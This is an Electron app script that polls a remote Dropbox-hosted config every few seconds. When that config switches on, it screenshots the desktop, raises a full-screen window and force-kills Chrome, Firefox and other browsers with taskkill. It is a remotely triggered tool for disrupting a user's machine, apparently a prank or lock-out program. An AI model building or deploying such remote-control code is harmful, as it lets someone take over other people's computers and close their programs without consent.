const {app, BrowserWindow, BrowserView, screen} = require("electron")
const screenshot = require("screenshot-desktop")
const path = require("path")
const fetch = require("node-fetch")
const fs = require("fs")
const {exec} = require('child_process')

var DEBUG = false

var is_activated = false
var window = null
const remote_check_period = DEBUG ? 1000 : 5000

function toBase64(arr) {
    //arr = new Uint8Array(arr) if it's an ArrayBuffer
    return btoa(
        arr.reduce((data, byte) => data + String.fromCharCode(byte), '')
    );
}

function get_current_time(){
    var date = new Date()
    var current_time = 
        date.getFullYear()*60*60*24*31*12
        + date.getMonth()*60*60*24*31 
        + date.getDate()*60*60*24 
        + date.getHours()*60*60 
        + date.getMinutes()*60 
        + date.getSeconds()
    return current_time
}

function createWindow() {
    console.log(screen.getPrimaryDisplay().bounds.width + "x" + screen.getPrimaryDisplay().bounds.height);

    window = new BrowserWindow({
        width: screen.getPrimaryDisplay().bounds.width,
        height: screen.getPrimaryDisplay().bounds.height,
        show: false,
        webPreferences: {
            // preload: path.join(__dirname, 'preload.js')
        }
    })

    // window.loadFile('web/index.html')

    // window.setClosable(false)
    // window.webContents.openDevTools()
    // window.setFullScreen(true)
    window.setSimpleFullScreen(true)
    window.setMenuBarVisibility(false)
    // window.setAlwaysOnTop(true)
    // window.setFocusable(false)

    window.on('show', () => {
        setTimeout(() => {
            window.focus();

            // setTimeout(() => {
            //     window.hide();
            // }, 1000);
        }, 200);
        
    });

    setTimeout(()=>{
        // window.show()
    }, 100)
}

function get_remote_state_data(callback){
    if(!DEBUG){
        var url = "https://dl.dropboxusercontent.com/s/so0u91mqtdg3cqg/tab_close_config.json"
        fetch(url).then((res)=>{
            return res.json()
        }).then((data)=>{
            callback(data)
        })

    }else{
        var raw = fs.readFileSync("debug_tab_close_config.json")
        var data = JSON.parse(raw)
        callback(data)
    }
}

function activate(state_data){
    is_activated = true
    screenshot({ filename: 'web/screenshot.png' })

    var data = {
        scene_name: "default",
        special_options: ""
    }
    window.loadFile('web/index.html').then(()=>{
        window.webContents.executeJavaScript(`
            activate(${JSON.stringify(data)});
        `)
        setTimeout(()=>{
            window.show()
            window.focus();
        }, 100)

        var appNames = ["browser.exe", "chrome.exe", "firefox.exe"]
        appNames.forEach(appName =>{
            try{
                if(!DEBUG) exec(`taskkill /im ${appName} /f`)
            }catch(e){
                console.error(e)
            }
        })
    })
}
function deactiavte(state_data){
    is_activated = false
    window.webContents.executeJavaScript(`
        deactivate();
    `)
    window.loadFile('')
    window.hide()
}

function check_remote_state(state_data){
    var current_time = get_current_time()
    
    var time_elapsed_from_start = current_time - state_data["start_time"]
    console.log("checking...")

    if(time_elapsed_from_start <= 2*60){
        if(state_data["active_state"] && !is_activated){
            window.webContents.executeJavaScript(`activate('${JSON.stringify(state_data)}')`)
            activate(state_data)
        }else
        if(!state_data["active_state"] && is_activated){
            window.webContents.executeJavaScript(`deactivate('${JSON.stringify(state_data)}')`)
            deactiavte(state_data)
        }
    }
}

function start_checking_loop(){
    setInterval(()=>{
        get_remote_state_data((data)=>{
            check_remote_state(data)
        })
    }, remote_check_period)
}

// start
app.whenReady().then(() => {

    setTimeout(()=>{
        createWindow()
    
        app.on('activate', () => {
            if(BrowserWindow.getAllWindows().length === 0){
                createWindow()
            }
        })

        start_checking_loop()
    }, 100)

})
app.on('window-all-closed', ()=>{
    if(process.platform !== 'darwin'){
        app.quit()
    }
})
